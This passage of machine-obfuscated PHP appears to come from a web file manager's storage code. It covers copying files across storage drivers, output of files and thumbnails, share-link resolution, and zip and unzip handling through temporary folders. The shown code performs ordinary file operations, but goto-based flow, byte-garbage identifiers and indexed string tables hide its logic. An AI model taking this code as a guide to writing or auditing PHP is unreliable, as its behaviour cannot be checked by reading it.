$CÉÍ–ƒË∞¿->fileNameExist($E°‡—≤‚éî, $Dﬂ¨Ø‘Èâï); $Dﬂ¨Ø‘Èâï = $CÉÍ–ƒË∞¿->fileNameAuto($E°‡—≤‚éî, $Dﬂ¨Ø‘Èâï, $bı¡Ë÷ëÌù, !$a¶±Ê´≤ø´); $bı¡Ë÷ëÌù = $a ΩÜÓ∆î ? $bı¡Ë÷ëÌù : !1; } goto a¨åà¬óÖß; B∞äŸä«Ú‰: $E∞∫π⁄ïïŒ = $CÉÍ–ƒË∞¿->mkdir($CÉÍ–ƒË∞¿->getPath($DÕ‹¯‚Ç‹˘)); $E°‡—≤‚éî = $CÉÍ–ƒË∞¿->getPathInner($E∞∫π⁄ïïŒ); $EΩ—Á§“î¯ = $F§ìÎ´Çá”->listPath($aœüäÊèœƒ, !0); goto f®äí⁄¿ñå; D√•äﬂ›ä¡: } private static function copyFile($E˜Õ“úâŸ, $aî¯öµŒ•ƒ, $B¡’çûáåÃ, $aﬁ¿ã«⁄é∑, $D˘¶•èæù, $aÖãË…ìÃÊ) { goto F’ë”ÔΩ€å; cèïä˘—çÇ: Hook::trigger($CìÕ√≥Ü¬…[1010], $E˜Õ“úâŸ, $aî¯öµŒ•ƒ, $B¡’çûáåÃ, $aﬁ¿ã«⁄é∑, $D˘¶•èæù, $FæãùÚ“¢∫); return $FæãùÚ“¢∫; goto bì¶•äÉÇ…; F’ë”ÔΩ€å: $CìÕ√≥Ü¬… =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aﬁ¿ã«⁄é∑ = $B¡’çûáåÃ->getPath(rtrim($aﬁ¿ã«⁄é∑, $CìÕ√≥Ü¬…[8]) . $CìÕ√≥Ü¬…[8] . $D˘¶•èæù); $eê‡Á‰ÕÁô = $CìÕ√≥Ü¬…[1008] . time() . rand_string(5); goto eœıò„‡ıÉ; eœıò„‡ıÉ: Hook::trigger($CìÕ√≥Ü¬…[1009], $E˜Õ“úâŸ, $aî¯öµŒ•ƒ, $B¡’çûáåÃ, $aﬁ¿ã«⁄é∑, $D˘¶•èæù, $eê‡Á‰ÕÁô); if (self::driverIsSame($E˜Õ“úâŸ, $B¡’çûáåÃ)) { if ($aÖãË…ìÃÊ) { $FæãùÚ“¢∫ = $B¡’çûáåÃ->moveFile($aî¯öµŒ•ƒ, $aﬁ¿ã«⁄é∑); } else { $FæãùÚ“¢∫ = $B¡’çûáåÃ->copyFile($aî¯öµŒ•ƒ, $aﬁ¿ã«⁄é∑); } Hook::trigger($CìÕ√≥Ü¬…[1010], $E˜Õ“úâŸ, $aî¯öµŒ•ƒ, $B¡’çûáåÃ, $aﬁ¿ã«⁄é∑, $D˘¶•èæù, $FæãùÚ“¢∫); return $FæãùÚ“¢∫; } $C¯õ‹æªôè = TEMP_FILES; goto fÇ§‚’úœÕ; fÇ§‚’úœÕ: mk_dir($C¯õ‹æªôè); $B°‰™ªèàé = $C¯õ‹æªôè . $eê‡Á‰ÕÁô; $B°‰™ªèàé = $E˜Õ“úâŸ->download($aî¯öµŒ•ƒ, $B°‰™ªèàé); goto C…ó÷ú⁄é§; C…ó÷ú⁄é§: $B°‰™ªèàé = $E˜Õ“úâŸ->iconvApp($B°‰™ªèàé); $FæãùÚ“¢∫ = $B¡’çûáåÃ->upload($aﬁ¿ã«⁄é∑, $B°‰™ªèàé, $aÖãË…ìÃÊ); self::remove($C¯õ‹æªôè . $eê‡Á‰ÕÁô); goto cèïä˘—çÇ; bì¶•äÉÇ…: } public static function pathFather($A∂®–ÖµÈ) { $Fê◊ã∑òΩâ = IO::init($A∂®–ÖµÈ); $dƒÔ“Ó‰·™ = $Fê◊ã∑òΩâ->pathFather($Fê◊ã∑òΩâ->path); return $Fê◊ã∑òΩâ->getPathOuter($dƒÔ“Ó‰·™); } public static function fileOut($bœÙç«Ñç÷, $D‰‚∏§À£î = false, $f§õÒÓëã© = false, $D§‚èæ˜Ô¡ = '') { $fÎæƒﬂÌ¿¬ = self::driverMake($bœÙç«Ñç÷); if ($fÎæƒﬂÌ¿¬->isFileOutServer()) { return $fÎæƒﬂÌ¿¬->fileOutServer($bœÙç«Ñç÷, $D‰‚∏§À£î, $f§õÒÓëã©, $D§‚èæ˜Ô¡); } return $fÎæƒﬂÌ¿¬->fileOut($bœÙç«Ñç÷, $D‰‚∏§À£î, $f§õÒÓëã©, $D§‚èæ˜Ô¡); } public static function fileOutImage($E≠Öß ®Ì‡, $Fû»Èï•Ã√ = 250) { $c‘í†≤˘⁄Ù = array(250, 600, 1200, 3000); for ($EÑ∆ØõØÇÏ = 0; $EÑ∆ØõØÇÏ < count($c‘í†≤˘⁄Ù); $EÑ∆ØõØÇÏ++) { if ($EÑ∆ØõØÇÏ == 0 && $Fû»Èï•Ã√ <= $c‘í†≤˘⁄Ù[$EÑ∆ØõØÇÏ]) { $Fû»Èï•Ã√ = $c‘í†≤˘⁄Ù[$EÑ∆ØõØÇÏ]; break; } else { if ($Fû»Èï•Ã√ > $c‘í†≤˘⁄Ù[$EÑ∆ØõØÇÏ - 1] && $Fû»Èï•Ã√ <= $c‘í†≤˘⁄Ù[$EÑ∆ØõØÇÏ]) { $Fû»Èï•Ã√ = $c‘í†≤˘⁄Ù[$EÑ∆ØõØÇÏ]; break; } else { if ($EÑ∆ØõØÇÏ == count($c‘í†≤˘⁄Ù) - 1 && $Fû»Èï•Ã√ > $c‘í†≤˘⁄Ù[$EÑ∆ØõØÇÏ]) { $Fû»Èï•Ã√ = $c‘í†≤˘⁄Ù[$EÑ∆ØõØÇÏ]; break; } } } } $a¯≤Œ«´¨ = self::driverMake($E≠Öß ®Ì‡); if ($a¯≤Œ«´¨->isFileOutServer()) { return $a¯≤Œ«´¨->fileOutImageServer($E≠Öß ®Ì‡, $Fû»Èï•Ã√); } return $a¯≤Œ«´¨->fileOutImage($E≠Öß ®Ì‡, $Fû»Èï•Ã√); } private static function driverIsSame($b‡ˆ‘‡∂¯·, $AÜﬁˆÒ˘ı¢) { goto b´•™π…å–; b´•™π…å–: $BøÜƒÊïœÍ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $AÔ“‚ΩÛ‰à = $b‡ˆ‘‡∂¯·->getType(); $C°£‘˘äÜÑ = $AÜﬁˆÒ˘ı¢->getType(); goto b‰—Ãﬂ„‹å; b‰—Ãﬂ„‹å: if ($AÔ“‚ΩÛ‰à != $C°£‘˘äÜÑ) { return !1; } if ($AÔ“‚ΩÛ‰à == $BøÜƒÊïœÍ[694]) { return !0; } if ($AÔ“‚ΩÛ‰à == $BøÜƒÊïœÍ[102]) { return !0; } goto D–åœÓí™ ; D–åœÓí™ : if ($b‡ˆ‘‡∂¯·->pathDriver == $AÜﬁˆÒ˘ı¢->pathDriver) { return !0; } return !1; goto aÀ©—î™Òã; aÀ©—î™Òã: } public static function copyUpdate($CÁëæ¬ÿ≥Ω, $C·úØäﬂÿà) { goto B˜öÉú§Ôÿ; B˜öÉú§Ôÿ: $AÔÈ’€â¥∆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!IO::exist($CÁëæ¬ÿ≥Ω)) { return !1; } if (!IO::exist($C·úØäﬂÿà)) { IO::mkdir($C·úØäﬂÿà); } goto C›€Ø¬∆´; C¡„ÒŸÕ∂Œ: Hook::trigger($AÔÈ’€â¥∆[1014], $CÁëæ¬ÿ≥Ω, $C·úØäﬂÿà, $b«ƒ«‹Ï‘Ã); foreach ($câáÌû‚öœ as $B¢»ÓÚÖıó) { IO::mkdir($B¢»ÓÚÖıó); } foreach ($Bè‰∞π©ÿ∫ as $B¢»ÓÚÖıó) { IO::copy($B¢»ÓÚÖıó[$AÔÈ’€â¥∆[1011]], $B¢»ÓÚÖıó[$AÔÈ’€â¥∆[1012]], REPEAT_REPLACE); } goto dµÇó≈∂¿Ú; DßÒî≤ÒßÛ: $câáÌû‚öœ = array(); foreach ($Fœˆ’Ö¢ë≠ as $då…´ôÔ£¿ => $B¢»ÓÚÖıó) { if (isset($FËøƒ„â¡ã[$då…´ôÔ£¿])) { if ($B¢»ÓÚÖıó[$AÔÈ’€â¥∆[76]] == 1) { continue; } if ($FËøƒ„â¡ã[$då…´ôÔ£¿][$AÔÈ’€â¥∆[77]] == $B¢»ÓÚÖıó[$AÔÈ’€â¥∆[77]]) { continue; } } if ($B¢»ÓÚÖıó[$AÔÈ’€â¥∆[76]] == 1) { $câáÌû‚öœ[] = $C·úØäﬂÿà . $AÔÈ’€â¥∆[8] . $då…´ôÔ£¿; continue; } $C∫å£¶ôÇ´ = strstr(trim($då…´ôÔ£¿, $AÔÈ’€â¥∆[8]), $AÔÈ’€â¥∆[8]) ? get_path_father($då…´ôÔ£¿) : $AÔÈ’€â¥∆[33]; $Bè‰∞π©ÿ∫[] = array($AÔÈ’€â¥∆[1011] => $B¢»ÓÚÖıó[$AÔÈ’€â¥∆[75]], $AÔÈ’€â¥∆[1012] => rtrim($C·úØäﬂÿà, $AÔÈ’€â¥∆[8]) . $AÔÈ’€â¥∆[8] . $C∫å£¶ôÇ´, $AÔÈ’€â¥∆[1013] => $B¢»ÓÚÖıó); } $b«ƒ«‹Ï‘Ã = array($AÔÈ’€â¥∆[167] => $Bè‰∞π©ÿ∫, $AÔÈ’€â¥∆[76] => $câáÌû‚öœ); goto C¡„ÒŸÕ∂Œ; C›€Ø¬∆´: $Fœˆ’Ö¢ë≠ = self::_listAll($CÁëæ¬ÿ≥Ω); $FËøƒ„â¡ã = self::_listAll($C·úØäﬂÿà); $Bè‰∞π©ÿ∫ = array(); goto DßÒî≤ÒßÛ; dµÇó≈∂¿Ú: } private static function _listAll($d¡Ûıóéöî) { $AµÖÚ‘Õ™◊ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d¡Ûıóéöî = KodIO::clear($d¡Ûıóéöî); $c±ÉÇ»”êÿ = IO::listAll($d¡Ûıóéöî); foreach ($c±ÉÇ»”êÿ as &$C‡‚¶ÍÑ‡Ö) { $C¨∫⁄ØÙ∫„ = substr($C‡‚¶ÍÑ‡Ö[$AµÖÚ‘Õ™◊[75]], strlen($d¡Ûıóéöî)); $C‡‚¶ÍÑ‡Ö[$AµÖÚ‘Õ™◊[1015]] = trim($C¨∫⁄ØÙ∫„, $AµÖÚ‘Õ™◊[8]); } return array_to_keyvalue($c±ÉÇ»”êÿ, $AµÖÚ‘Õ™◊[1015]); } public static function fileSubstr($cùöÓÏ¨⁄, $B¶’∞Àé™É, $FéÍØë∂éÌ = false) { goto dò»åŒîÚä; eΩ“ì—Ÿ‘’: return $d º£–Û§ô->fileSubstr($cùöÓÏ¨⁄, $B¶’∞Àé™É, $FéÍØë∂éÌ); goto a‡ıÎı∫È¨; FÜÚùï∏ù¶: if ($B¶’∞Àé™É + $FéÍØë∂éÌ > $e°ÆÔÉŒÇä) { $FéÍØë∂éÌ = $e°ÆÔÉŒÇä - $B¶’∞Àé™É; } if ($FéÍØë∂éÌ <= 0) { return $_SERVER[Ä¿¡‡öóµŸﬂ‡][33]; } if ($B¶’∞Àé™É < 0 || $B¶’∞Àé™É >= $e°ÆÔÉŒÇä || $FéÍØë∂éÌ > 1024 * 1024 * 5) { throw new Exception("\x66\x69\x6c\145\x52\145\x61\144\40\145\162\162\157\162\41\40\x73\x74\141\x72\164\75{$B¶’∞Àé™É}\x3b\x6c\x65\x6e\x67\x74\150\x3d{$FéÍØë∂éÌ}\x3b\x20\163\x69\172\145\75{$e°ÆÔÉŒÇä}\73"); } goto eΩ“ì—Ÿ‘’; dı§Ñ∫π≤„: $dÜ≈ß¢Óëá = $FéÍØë∂éÌ; if ($B¶’∞Àé™É < 0) { $B¶’∞Àé™É = $e°ÆÔÉŒÇä + $B¶’∞Àé™É; } if ($FéÍØë∂éÌ === !1) { $FéÍØë∂éÌ = $e°ÆÔÉŒÇä - $B¶’∞Àé™É; } goto FÜÚùï∏ù¶; dò»åŒîÚä: $d º£–Û§ô = self::driverMake($cùöÓÏ¨⁄); $e°ÆÔÉŒÇä = $d º£–Û§ô->size($cùöÓÏ¨⁄); $EÙÌçîúçã = $B¶’∞Àé™É; goto dı§Ñ∫π≤„; a‡ıÎı∫È¨: } private static function driverMake(&$c¬∞ﬂÒú÷≥) { goto d≈ëÍ∞¢Û´; bóê»ßÉç∂: if ($eØÜÓõˆﬁø[$F∫ü¯Æ¢èÎ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$eØÜÓõˆﬁø[$F∫ü¯Æ¢èÎ[367]]]) { return !1; } $c¬∞ﬂÒú÷≥ = $eØÜÓõˆﬁø[$F∫ü¯Æ¢èÎ[1016]]; $DÀáêÇπé◊ = self::driverGet($eØÜÓõˆﬁø, $c¬∞ﬂÒú÷≥); goto FÜÌáØÏÕî; FÜÌáØÏÕî: return $DÀáêÇπé◊; goto D±°éÒˆÌÕ; d≈ëÍ∞¢Û´: $F∫ü¯Æ¢èÎ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eØÜÓõˆﬁø = KodIO::parse($c¬∞ﬂÒú÷≥); if (!self::$driverListSystem) { $B‡Î≥‰‘ûø = Model($F∫ü¯Æ¢èÎ[704])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($B‡Î≥‰‘ûø, $F∫ü¯Æ¢èÎ[367]); } goto bóê»ßÉç∂; D±°éÒˆÌÕ: } private static function driverGet($fíÊ’øÖ∏ı, &$f§ª–Ö„êË) { goto fçïÌôíå¨; fçïÌôíå¨: $FöÎ≈Ç„‹∑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b’‹˜©é…Ó = $fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[1017]]; $déèó˜é∞¬ = $fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[367]]; goto a„‘ﬂãñ€Í; BóëÏ≥ßÊœ: $aŸàœ“ ›∏ = self::$driverCache[$cèêÚŸæÑ∞]; $aŸàœ“ ›∏->pathDriver = $b’‹˜©é…Ó; $aŸàœ“ ›∏->pathBase = $FöÎ≈Ç„‹∑[33]; goto E–óøÇò‚; E–óøÇò‚: if (isset($aÁìïŸßÉÎ[$FöÎ≈Ç„‹∑[6]][$FöÎ≈Ç„‹∑[1028]])) { $aŸàœ“ ›∏->pathBase = rtrim($aÁìïŸßÉÎ[$FöÎ≈Ç„‹∑[6]][$FöÎ≈Ç„‹∑[1028]], $FöÎ≈Ç„‹∑[8]) . $FöÎ≈Ç„‹∑[8]; $f§ª–Ö„êË = $aŸàœ“ ›∏->pathBase . ltrim($f§ª–Ö„êË, $FöÎ≈Ç„‹∑[8]); } $f§ª–Ö„êË = $aŸàœ“ ›∏->getPath($f§ª–Ö„êË); if (isset($fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[1002]])) { $f§ª–Ö„êË = $fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[1002]]; } goto dª€Ñ˘éÑù; a„‘ﬂãñ€Í: switch ($fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[29]]) { case KodIO::KOD_IO: $aÁìïŸßÉÎ = self::$driverListSystem[$déèó˜é∞¬]; break; case KodIO::KOD_SOURCE: $f§ª–Ö„êË = $déèó˜é∞¬ . $f§ª–Ö„êË; $aÁìïŸßÉÎ = array($FöÎ≈Ç„‹∑[1018] => $FöÎ≈Ç„‹∑[1019], $FöÎ≈Ç„‹∑[6] => $fíÊ’øÖ∏ı); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $eåÕÔåŒœ‰ = $GLOBALS[$FöÎ≈Ç„‹∑[1020]]; self::$driverListUser = array_to_keyvalue($eåÕÔåŒœ‰, $FöÎ≈Ç„‹∑[367]); } $aÁìïŸßÉÎ = self::$driverListUser[$déèó˜é∞¬]; break; case KodIO::KOD_SHARE_LINK: $aÁìïŸßÉÎ = array($FöÎ≈Ç„‹∑[1018] => $FöÎ≈Ç„‹∑[1021], $FöÎ≈Ç„‹∑[6] => $fíÊ’øÖ∏ı); $dà“ô§æµ∫ = Action($FöÎ≈Ç„‹∑[1022])->sharePathInfo($fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[75]]); $f§ª–Ö„êË = $dà“ô§æµ∫[$FöÎ≈Ç„‹∑[369]]; if (!$dà“ô§æµ∫[$FöÎ≈Ç„‹∑[369]]) { $E´—áˆ∆ú¥ = Model($FöÎ≈Ç„‹∑[536])->getInfo($dà“ô§æµ∫[$FöÎ≈Ç„‹∑[441]]); $f§ª–Ö„êË = KodIO::clear($E´—áˆ∆ú¥[$FöÎ≈Ç„‹∑[1023]] . $fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[1016]]); $fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[439]] = $E´—áˆ∆ú¥; $fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[1002]] = $f§ª–Ö„êË; $aÁìïŸßÉÎ = array($FöÎ≈Ç„‹∑[1018] => $FöÎ≈Ç„‹∑[1024], $FöÎ≈Ç„‹∑[6] => $fíÊ’øÖ∏ı); } break; case KodIO::KOD_SHARE_ITEM: $aÁìïŸßÉÎ = array($FöÎ≈Ç„‹∑[1018] => $FöÎ≈Ç„‹∑[1025], $FöÎ≈Ç„‹∑[6] => $fíÊ’øÖ∏ı); $E´—áˆ∆ú¥ = Model($FöÎ≈Ç„‹∑[536])->getInfo($fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[367]]); if ($E´—áˆ∆ú¥[$FöÎ≈Ç„‹∑[369]] == $FöÎ≈Ç„‹∑[468]) { $f§ª–Ö„êË = KodIO::clear($E´—áˆ∆ú¥[$FöÎ≈Ç„‹∑[1023]] . $fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[1016]]); $fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[439]] = $E´—áˆ∆ú¥; $fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[1002]] = $f§ª–Ö„êË; $aÁìïŸßÉÎ = array($FöÎ≈Ç„‹∑[1018] => $FöÎ≈Ç„‹∑[1026], $FöÎ≈Ç„‹∑[6] => $fíÊ’øÖ∏ı); } else { if (!$f§ª–Ö„êË) { $f§ª–Ö„êË = $E´—áˆ∆ú¥[$FöÎ≈Ç„‹∑[369]]; } } break; default: $f§ª–Ö„êË = $fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[75]]; $aÁìïŸßÉÎ = array($FöÎ≈Ç„‹∑[1018] => $FöÎ≈Ç„‹∑[1027]); break; } $cèêÚŸæÑ∞ = $fíÊ’øÖ∏ı[$FöÎ≈Ç„‹∑[75]]; if (!isset(self::$driverCache[$cèêÚŸæÑ∞])) { $DÑ‡≠µÙâ‰ = strtolower($aÁìïŸßÉÎ[$FöÎ≈Ç„‹∑[90]]); $DÉò·—•ÒË = $GLOBALS[$FöÎ≈Ç„‹∑[6]][$FöÎ≈Ç„‹∑[84]][$FöÎ≈Ç„‹∑[762]]; $a◊±åä¨Ã = $FöÎ≈Ç„‹∑[71] . (isset($DÉò·—•ÒË[$DÑ‡≠µÙâ‰]) ? $DÉò·—•ÒË[$DÑ‡≠µÙâ‰] : ucfirst($DÑ‡≠µÙâ‰)); if (!class_exists($a◊±åä¨Ã)) { show_json("{$a◊±åä¨Ã}\x20\156\157\164\40\145\170\151\x73\164\163\41", !1); } $bŒÍ«¿…£Õ = isset($aÁìïŸßÉÎ[$FöÎ≈Ç„‹∑[6]]) ? $aÁìïŸßÉÎ[$FöÎ≈Ç„‹∑[6]] : !1; self::$driverCache[$cèêÚŸæÑ∞] = new $a◊±åä¨Ã($bŒÍ«¿…£Õ); } goto BóëÏ≥ßÊœ; dª€Ñ˘éÑù: $aŸàœ“ ›∏->path = $f§ª–Ö„êË; return $aŸàœ“ ›∏; goto A¬ÏæóÜ¬∞; A¬ÏæóÜ¬∞: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $aìõË›´∆Ñ; if (!$aìõË›´∆Ñ) { $f’Ü˘‘¬π∞ = IO::init($_SERVER[Ä¿¡‡öóµŸﬂ‡][8]); } return $f’Ü˘‘¬π∞; } private static function iconvSystem($c¨ÎﬁË»äõ) { return self::local()->iconvSystem($c¨ÎﬁË»äõ); } private static function iconvApp($CÚ◊êÕﬂ„†) { return self::local()->iconvApp($CÚ◊êÕﬂ„†); } public static function zip($EÁÑﬁ¿ÁÇ÷, $aˆÿ´–”ä® = "\172\x69\x70", $f‚≤—êﬁÿ± = '', $F‹Ç” •Ç◊ = REPEAT_RENAME) { goto Aƒ«òﬁö°Ô; EºÎÍ¨ÇãÌ: foreach ($CÁÆÇúàó› as $FÓéÁ«âØÉ => $cì∂ñÁ±îÉ) { $CÁÆÇúàó›[$FÓéÁ«âØÉ] = self::iconvSystem($cì∂ñÁ±îÉ); } KodArchive::create($bñîıÔª‹Ÿ, $CÁÆÇúàó›); if (!IO::exist($FØÃ⁄¶¿æœ)) { if ($côô£ÿéó) { del_dir($côô£ÿéó); } show_json(LNG($C≠‡±÷äçª[1031]), !1); } goto b·é’‘…´ƒ; Aƒ«òﬁö°Ô: $C≠‡±÷äçª =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e©‹ó†‡∞å = self::init($EÁÑﬁ¿ÁÇ÷[0][$C≠‡±÷äçª[75]]); $bÙª¶îù¶ë = self::info($EÁÑﬁ¿ÁÇ÷[0][$C≠‡±÷äçª[75]]); goto BØúœÌÜå£; eì Ωß¥ñä: if (count($CÁÆÇúàó›) > 1) { $dÓÓÈ¿òÛô = IO::info(IO::pathFather($bÙª¶îù¶ë[$C≠‡±÷äçª[75]])); $dƒÌ¨é©ñå = $dÓÓÈ¿òÛô[$C≠‡±÷äçª[28]]; } $Båπø–‚¯” = $côô£ÿéó; if (!$Båπø–‚¯”) { $Båπø–‚¯” = get_path_father($bÙª¶îù¶ë[$C≠‡±÷äçª[75]]); $b◊ä¡≥‚Üà = IO::info($Båπø–‚¯”); if (!$b◊ä¡≥‚Üà[$C≠‡±÷äçª[189]]) { show_json(LNG($C≠‡±÷äçª[1030]), !1); } } goto dœ£é∏û¿ÿ; BØúœÌÜå£: $côô£ÿéó = !1; if (!$f‚≤—êﬁÿ± && $e©‹ó†‡∞å->getType() == $C≠‡±÷äçª[102]) { $CÁÆÇúàó› = self::zipFileList($EÁÑﬁ¿ÁÇ÷); } else { $côô£ÿéó = $f‚≤—êﬁÿ± ? $f‚≤—êﬁÿ± : TEMP_FILES . $C≠‡±÷äçª[1029] . time() . rand_string(8) . $C≠‡±÷äçª[8]; mk_dir($côô£ÿéó); $CÁÆÇúàó› = self::zipFileList($EÁÑﬁ¿ÁÇ÷, $côô£ÿéó); } $dƒÌ¨é©ñå = $bÙª¶îù¶ë[$C≠‡±÷äçª[28]]; goto eì Ωß¥ñä; dœ£é∏û¿ÿ: $FØÃ⁄¶¿æœ = $Båπø–‚¯” . $dƒÌ¨é©ñå . $C≠‡±÷äçª[91] . $aˆÿ´–”ä®; $FØÃ⁄¶¿æœ = get_filename_auto($FØÃ⁄¶¿æœ, $C≠‡±÷äçª[33], $F‹Ç” •Ç◊); $bñîıÔª‹Ÿ = self::iconvSystem($FØÃ⁄¶¿æœ); goto EºÎÍ¨ÇãÌ; aºî≠¿º†Í: if (!$d¬â¬ﬂà‹è) { del_dir($côô£ÿéó); show_json(LNG($C≠‡±÷äçª[1031]), !1); } del_dir($côô£ÿéó); return $d¬â¬ﬂà‹è; goto b„ÃÏ Ç‘†; b·é’‘…´ƒ: if ($f‚≤—êﬁÿ± || !$côô£ÿéó) { if ($côô£ÿéó && strstr($côô£ÿéó, TEMP_FILES)) { $Eﬂü‚„ÎæÛ = $CÁÆÇúàó› = array(); recursion_dir($Båπø–‚¯”, $Eﬂü‚„ÎæÛ, $CÁÆÇúàó›, 0); foreach ($Eﬂü‚„ÎæÛ as $Fã¡ç≤ºÙ˘) { del_dir($Fã¡ç≤ºÙ˘); } foreach ($CÁÆÇúàó› as $fõµ¡Á“É„) { if ($fõµ¡Á“É„ == $bñîıÔª‹Ÿ) { continue; } del_file($fõµ¡Á“É„); } } return $FØÃ⁄¶¿æœ; } $AÛøìì≤ﬂÇ = self::pathFather($bÙª¶îù¶ë[$C≠‡±÷äçª[75]]); $d¬â¬ﬂà‹è = self::move($FØÃ⁄¶¿æœ, $AÛøìì≤ﬂÇ, $F‹Ç” •Ç◊); goto aºî≠¿º†Í; b„ÃÏ Ç‘†: } public static function unzip($FÊƒáñπÿ¢, $cŸı£ü§°› = "\x72\145\x70\x6c\141\143\145") { goto Eû≠‡ñÙÑπ; fñ∂û∏ÚÒõ: if (!($eÛª‰Ü≤ã = parent::info($Cì»–™ó±®))) { show_json(LNG($CÜ¶„àìÍ„[1033]), !1); } if (!($aÙé±´◊´≈ = parent::infoFull($D‘ÓŸ›é∂ë))) { $D‘ÓŸ›é∂ë = parent::mkdir($D‘ÓŸ›é∂ë); $aÙé±´◊´≈ = array($CÜ¶„àìÍ„[75] => $D‘ÓŸ›é∂ë); } else { if (isset($aÙé±´◊´≈[$CÜ¶„àìÍ„[369]]) && trim($aÙé±´◊´≈[$CÜ¶„àìÍ„[75]], $CÜ¶„àìÍ„[8]) != trim($D‘ÓŸ›é∂ë, $CÜ¶„àìÍ„[8])) { $bÿ≥∏«Âö» = KodIO::make($aÙé±´◊´≈[$CÜ¶„àìÍ„[461]]); $e“ó†≈ùæü = parent::fileNameAuto($bÿ≥∏«Âö», $aÙé±´◊´≈[$CÜ¶„àìÍ„[28]], REPEAT_RENAME_FOLDER, !0); $D‘ÓŸ›é∂ë = parent::mkdir($bÿ≥∏«Âö» . $e“ó†≈ùæü); $aÙé±´◊´≈ = array($CÜ¶„àìÍ„[75] => $D‘ÓŸ›é∂ë); } } $D‘ÓŸ›é∂ë = $aÙé±´◊´≈[$CÜ¶„àìÍ„[75]]; goto BŒî¥é‹†ó; a‹ëÿ÷ê·π: $C´ ¥∂≤˜Œ = KodArchive::extract($C÷îñ¨†èå, $a°‘ÓáœÚ . $CÜ¶„àìÍ„[8], $e∆’—¨ó£ü); self::archiveExt(); if (!$C´ ¥∂≤˜Œ[$CÜ¶„àìÍ„[1036]]) { show_json($CÜ¶„àìÍ„[1037] . $C´ ¥∂≤˜Œ[$CÜ¶„àìÍ„[1038]], !1); } goto F«êæ◊‘´±; b¬ÙïæÒëò: foreach ($fÛ∑äãÇúÃ as $A‡‡åø≈ëä) { $A‡‡åø≈ëä = self::iconvApp($A‡‡åø≈ëä); self::move($A‡‡åø≈ëä, $D‘ÓŸ›é∂ë, $cŸı£ü§°›); } del_dir($a°‘ÓáœÚ); if (!$B¢è´∞óÇ∑) { del_file($C÷îñ¨†èå); } goto E£ç∏Ì™ùí; BŒî¥é‹†ó: $aƒœΩ¨‘À∆ = self::tmpFileName($eÛª‰Ü≤ã); $a°‘ÓáœÚ = TEMP_FILES . $aƒœΩ¨‘À∆; del_dir($a°‘ÓáœÚ); goto bíåõ‚ˆÖ—; F«êæ◊‘´±: Hook::trigger($CÜ¶„àìÍ„[1039], $a°‘ÓáœÚ); recursion_dir($a°‘ÓáœÚ, $Cäûè¥≈é£, $Eã¢Ó¡â˜¢, 0); $fÛ∑äãÇúÃ = array_merge($Cäûè¥≈é£, $Eã¢Ó¡â˜¢); goto b¬ÙïæÒëò; Eû≠‡ñÙÑπ: $CÜ¶„àìÍ„ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Cì»–™ó±® = $FÊƒáñπÿ¢[$CÜ¶„àìÍ„[75]]; $D‘ÓŸ›é∂ë = $FÊƒáñπÿ¢[$CÜ¶„àìÍ„[1032]]; goto fñ∂û∏ÚÒõ; E£ç∏Ì™ùí: return !0; goto Eùõ‘Ÿ∏è¿; bíåõ‚ˆÖ—: mk_dir($a°‘ÓáœÚ); $A¨Éù›‘ ç = self::fileExt($eÛª‰Ü≤ã); $C÷îñ¨†èå = $a°‘ÓáœÚ . $CÜ¶„àìÍ„[91] . $A¨Éù›‘ ç; goto Eö‡÷ÖªÔ–; Eö‡÷ÖªÔ–: if (!@file_exists(self::iconvSystem($C÷îñ¨†èå))) { $B¢è´∞óÇ∑ = self::localFilePath($Cì»–™ó±®, $A¨Éù›‘ ç); $C÷îñ¨†èå = $B¢è´∞óÇ∑ ? $B¢è´∞óÇ∑ : parent::download($Cì»–™ó±®, $C÷îñ¨†èå); } $C÷îñ¨†èå = self::iconvSystem($C÷îñ¨†èå); $e∆’—¨ó£ü = isset($FÊƒáñπÿ¢[$CÜ¶„àìÍ„[1034]]) ? $FÊƒáñπÿ¢[$CÜ¶„àìÍ„[1034]] : $CÜ¶„àìÍ„[1035]; goto a‹ëÿ÷ê·π; Eùõ‘Ÿ∏è¿: } public static function unzipList($A–‚æ„Ûãµ) { goto B®€—‹ÚÏù; D¥Ö˘¥ëÆ∫: if (!is_dir($d⁄™˜Û—¯—)) { mk_dir($d⁄™˜Û—¯—); } $E’πææ˘ê® = $d⁄™˜Û—¯— . $DØàïà¯‰ó[8] . $f«Î…¢≥ñ¥; if (!@file_exists(self::iconvSystem($E’πææ˘ê®))) { if (isset($bÜÔçäπùã)) { url_request($b⁄ÈÁù£Àû, $DØàïà¯‰ó[1043], $E’πææ˘ê®); } else { $B÷Øäÿâ»‹ = self::localFilePath($b⁄ÈÁù£Àû, $E¢Œéè∏ÑÏ); $E’πææ˘ê® = $B÷Øäÿâ»‹ ? $B÷Øäÿâ»‹ : self::download($b⁄ÈÁù£Àû, $E’πææ˘ê®); } } goto dò©ÌÍ¯¶Ò; fïøÏÍã¡ç: self::archiveExt(); del_dir($d⁄™˜Û—¯—); if (!$c›™Â¢øÌœ[$DØàïà¯‰ó[1036]]) { show_json($c›™Â¢øÌœ[$DØàïà¯‰ó[1038]], !1); } goto E≤ù⁄âõ; 